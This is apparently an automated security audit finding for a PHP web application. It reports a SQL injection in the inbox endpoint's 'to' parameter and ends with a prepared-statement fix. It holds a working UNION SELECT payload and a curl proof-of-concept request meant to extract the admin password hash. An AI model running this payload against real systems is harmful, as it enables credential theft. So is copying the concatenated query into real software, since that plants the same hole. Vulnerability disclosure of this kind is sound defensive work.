# Vulnerability: SQL Injection — Inbox Message Send via getIdByUsername()

## Summary
The `user/inbox.php` endpoint passes `post('to')` to `getIdByUsername()` at line 10, which concatenates the value directly into a SQL query at `init.php:26`. An authenticated attacker can inject arbitrary SQL through the `to` parameter to extract password hashes and other user data.

## Confidence
High

## Authentication Requirement
Authenticated (Low Privilege)

## Attack Surface Location
- **Endpoint:** `POST /user/inbox.php`
- **Handler:** `user/inbox.php:1-52`
- **Middleware / Guards:** AumWAF, `isAuth()` check

## Attack Chain
1. **Initial access:** Attacker authenticates as any registered user.
2. **Endpoint interaction:** The inbox handler reads `post('to')` at line 10 and passes it to `getIdByUsername()`.
3. **Malicious input:** `to` POST param = `' UNION SELECT userpass FROM tbl_users WHERE username='admin' -- -` to extract the admin's password hash.
4. **Sink execution:** `getIdByUsername()` at `init.php:26` executes `"SELECT id FROM tbl_users WHERE username = '" . $username . "'"` — the injected SQL modifies the query to return an attacker-controlled value.
5. **Post-exploitation:** Attacker extracts password hashes via the `to` parameter injection.
6. **Final impact:** Data disclosure (password hashes), data manipulation.

## Data Flow
- **Source (user input):** `$_POST['to']`
- **Sink:** `$mysqli->query()` at `init.php:26` (via `getIdByUsername()`)

```
$_POST['to'] → post('to') [common.php:32-33] → getIdByUsername(post('to')) [inbox.php:10] → getIdByUsername($username) [init.php:24] → "SELECT id FROM tbl_users WHERE username = '" . $username . "'" [init.php:26] → $mysqli->query() [init.php:26]
```

## Proof of Concept

### Prerequisites
- Valid session cookie from any registered user account.

### Exploit Request — Extract Password Hash via to Parameter
```bash
curl -X POST "http://{{TARGET_HOST}}/user/inbox.php" \
  -b "PHPSESSID={{SESSION_ID}}" \
  -d "to='+UNION+SELECT+userpass+FROM+tbl_users+WHERE+username='admin'--&subject=test&message=test"
```

### Expected Vulnerable Response
The `getIdByUsername()` call with the injected `to` value returns an attacker-controlled result. The sub-query itself executes the injected SQL.

### Expected Patched Response
After parameterized queries, the injection is treated as literal data — the lookup returns only the matching user's ID.

### Impact Demonstration
Attacker can extract password hashes from the `tbl_users` table via the `getIdByUsername()` SQL injection.

## Affected Code
```php
// user/inbox.php:10
$sql = sprintf("INSERT INTO tbl_support (user_id, to_id, subject, message) values ('%d', '%d', '%s', '%s')", cookie('user_id'), getIdByUsername(post('to')), post('subject'), post('message'));

// init.php:24-27
function getIdByUsername($username) {
    global $mysqli;
    return $mysqli->query("SELECT id FROM tbl_users WHERE username = '" . $username . "'")->fetch_object()->id;
}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `POST /user/inbox.php` requires only `isAuth()`. `post('to')` reads directly from `$_POST`. The call chain is direct with no guard.
- **Impact attack — FAILED to kill.** SQL injection in `getIdByUsername()` enables data exfiltration from `tbl_users`.
- **Validity attack — FAILED to kill.** `getIdByUsername()` uses direct string concatenation with no escaping.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Use prepared statements in `getIdByUsername()`:
```php
function getIdByUsername($username) {
    global $mysqli;
    $stmt = $mysqli->prepare("SELECT id FROM tbl_users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    return $stmt->get_result()->fetch_object()->id;
}
```